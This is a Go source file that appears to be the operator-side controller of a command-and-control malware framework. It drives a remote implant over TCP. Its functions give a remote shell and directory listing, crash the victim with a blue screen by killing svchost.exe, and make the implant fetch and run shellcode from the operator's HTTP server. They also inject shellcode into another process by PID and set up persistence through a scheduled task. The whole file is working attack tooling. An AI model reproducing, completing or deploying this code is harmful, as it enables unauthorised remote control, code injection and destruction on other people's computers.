package cmd

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/D3Ext/maldev/logging"
)

// Server-Sides needs to handle errors better
func shell(conn *net.Conn) { //Test cd and pwd. They work almost flawlessly.
	reader := bufio.NewReader(os.Stdin)
L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
	for {
		fmt.Print(logging.SBlue("PS > "))
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-]Error reading input:", err)
			continue
		}
		command = strings.TrimSpace(command)
		cdRegex := regexp.MustCompile(`cd .+`)
		cdRegexComp := cdRegex.FindString(command)
		if cdRegexComp != "" {
			dir2Go := strings.Split(command, " ")[1]
			cd(conn, dir2Go)
			continue
		}
		switch command {
		case "":
			continue
		case "cls":
			continue
		case "bg":
			break L
		case "exit":
			break L
		case "pwd":
			pwd(conn)
		default:

			(*conn).Write([]byte(command))

			// Read the length prefix (4 bytes)
			lengthBytes := make([]byte, 4)
			_, err := io.ReadFull(*conn, lengthBytes) // Ensure we read exactly 4 bytes
			if err != nil {
				fmt.Println("Error reading data length:", err)
				(*conn).Close()
				return
			}

			// Decode the length of the incoming data
			totalLength := binary.BigEndian.Uint32(lengthBytes)
			fmt.Printf("Expecting %d bytes of data\n", totalLength)

			// Read the data in chunks
			data := make([]byte, totalLength)
			bytesRead := 0

			for bytesRead < int(totalLength) {
				n, err := (*conn).Read(data[bytesRead:])
				if err != nil {
					fmt.Println("Error reading data:", err)
					(*conn).Close()
					return
				}
				bytesRead += n
			}
			fmt.Println(string(data))
			fmt.Printf("Received %d bytes successfully\n", bytesRead)
		}
	}
}

func hostinfo(conn *net.Conn) (string, string) {
	fmt.Println()
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("[-]Read Length is 0")
		return "ERROR", "ERROR"
	}
	if err != nil {
		fmt.Println("[-]Error with reading from buffer")
		return "ERROR", "ERROR"
	}
	info := string(request[:read_len])
	parts := strings.SplitN(info, "\n", 2)
	if len(parts) != 2 {
		log.Println("[-] Invalid data format")
		return "ERROR", "ERROR"
	}
	hostname := parts[0]
	whoami := parts[1]
	return hostname, whoami
}

func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
	fmt.Println("[!]Initiating BSOD by killing svchost.exe")
	(*conn).Write([]byte("SelfDestruct\n"))
	fmt.Println("[+]Kill Signal Sent")
	reply := make([]byte, 9000)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))

	read_len, err := (*conn).Read(reply)
	if read_len == 0 {
		(*conn).Close()
		return true
	}
	if err != nil {
		(*conn).Close()
		return true
	}
	strReply := string(reply[:read_len])
	if strReply == "NoTime2Die\n" {
		fmt.Println(strReply)
		return false
	}
	return true
}

// func playAudio(conn *net.Conn, audioFile string) {
// 	fmt.Println("Playing audio on the remote host :)")
// 	contents, err := os.ReadFile("Audio/" + audioFile)
// 	if err != nil {
// 		fmt.Println("Couldn't read the file !")
// 		return
// 	}
// 	(*conn).Write([]byte("play\n"))
// 	(*conn).Write(contents)
// }

// v4. It works. Review this thanks to GPT
func ls(conn *net.Conn) {
	(*conn).Write([]byte("ls\n"))

	// Read the length prefix (4 bytes)
	lengthBytes := make([]byte, 4)
	_, err := io.ReadFull(*conn, lengthBytes) // Ensure we read exactly 4 bytes
	if err != nil {
		fmt.Println("Error reading data length:", err)
		(*conn).Close()
		return
	}

	// Decode the length of the incoming data
	totalLength := binary.BigEndian.Uint32(lengthBytes)
	fmt.Printf("Expecting %d bytes of data\n", totalLength)

	// Read the data in chunks
	data := make([]byte, totalLength)
	bytesRead := 0

	for bytesRead < int(totalLength) {
		n, err := (*conn).Read(data[bytesRead:])
		if err != nil {
			fmt.Println("Error reading data:", err)
			(*conn).Close()
			return
		}
		bytesRead += n
	}

	// Print the received directory listing
	fmt.Println("\n	SIZE(KB)		MODE		NAME")
	fmt.Println("	--------		-----		-----")
	fmt.Println(string(data))

	fmt.Printf("Received %d bytes successfully\n", bytesRead)
}

func cd(conn *net.Conn, dir2go string) {
	//fmt.Println(dir2go)
	(*conn).Write([]byte("cd\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	(*conn).Write([]byte(dir2go))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	strBuffer := string(bufferSnapped)
	if strBuffer != "OK\n" {
		fmt.Println("ERROR")
	}
}

func pwd(conn *net.Conn) {
	(*conn).Write([]byte("pwd\n"))
	request := make([]byte, 99999)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println()
	fmt.Println(reply)
	fmt.Println()
}

func load(conn *net.Conn, fileWShellcode string) {
	fmt.Println()
	fmt.Println("[!]Local File Path: " + fileWShellcode)
	file, err := os.Stat(fileWShellcode)
	if err != nil {
		fmt.Println("[-]Couldn't read the file on the local machine !")
		return
	}
	fmt.Println("[*]Sending Signal ...")
	(*conn).Write([]byte("barCode\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Couldn't initate CreateThread")
		return
	}
	fmt.Println("[+]Signal was recieved and acknowledged")
	localAddress := (*conn).LocalAddr().String()
	localIP := strings.Split(localAddress, ":")[0]
	//Since we hard coded it to be 8080 the port we listen on we do the folowing
	downloadURL := "http://" + localIP + ":8080/" + file.Name()
	(*conn).Write([]byte(downloadURL))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]URL did not send")
		return
	}
	fmt.Println("[+]Download URL sent successfully !")
	fmt.Println("[*]Started python HTTP Server in Bushido dir")
	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the shellcode !")
	cmd := exec.Command("./scripts/pythonServer.sh")
	cmd.Run()
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	//(*conn).SetReadDeadline(10 * time.Second)
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Something went wrong")
		return
	}
	fmt.Println("[+]Successful Loading !")
	fmt.Println()
}

// Detectable
func persist(conn *net.Conn, fileName string) {
	//fmt.Println(fileName)
	(*conn).Write([]byte("persist\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Something went wrong creating persistance")
		return
	}
	//Read the response from the client
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	fmt.Println()
	if strings.Contains(bufferStr, "already exists") {
		fmt.Println("[!]The scheduled task for " + fileName + " already exists ...")
		fmt.Println() //Just some beautification of output server side
	} else {
		fmt.Println("[!]" + bufferStr)
	}
}

// Continue this later
func remoteThread(conn *net.Conn, fileWShellcode string, pid string) {
	fmt.Println()
	fmt.Println("[!]Local File Path: " + fileWShellcode)
	file, err := os.Stat(fileWShellcode)
	if err != nil {
		fmt.Println("[-]Couldn't read the file on the local machine !")
		return
	}
	fmt.Println("[*]Sending Signal ...")
	(*conn).Write([]byte("remote\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Couldn't initate CreateRemoteThread")
		return
	}
	fmt.Println("[+]Signal was recieved and acknowledged")
	localAddress := (*conn).LocalAddr().String()
	localIP := strings.Split(localAddress, ":")[0]
	//Since we hard coded it to be 8080 the port we listen on we do the folowing
	downloadURL := "http://" + localIP + ":8080/" + file.Name()
	(*conn).Write([]byte(downloadURL))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]URL did not send")
		return
	}
	fmt.Println("[+]Download URL sent successfully !")
	fmt.Println("[*]Sending PID ...")
	(*conn).Write([]byte(pid))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]PID did not send")
		return
	}
	fmt.Println("[*]Started python HTTP Server in Bushido dir")
	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the shellcode !")
	cmd := exec.Command("./scripts/pythonServer.sh")
	cmd.Run()
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	//(*conn).SetReadDeadline(10 * time.Second)
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Something went wrong")
		return
	}
	fmt.Println("[+]Successful Proccess Injection !")
	fmt.Println()
}
